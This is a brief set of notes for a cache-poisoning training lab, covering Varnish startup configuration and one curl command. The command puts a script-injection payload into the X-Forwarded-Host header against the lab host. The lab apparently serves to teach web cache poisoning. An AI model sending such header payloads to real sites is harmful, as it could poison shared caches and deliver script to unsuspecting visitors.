# Cache Poison Lab

## How to configure Varnish Startup

You can't edit `/etc/default/varnish` any more, it is ignored. See this

<https://github.com/varnish/Varnish-Cache/pull/92#>


## X-Forwarded-For

```
curl http://42127f-poison.digi.ninja:81/basic.php -H "X-Forwarded-Host: test.com\"><script>alert(1)</script>" -i

```
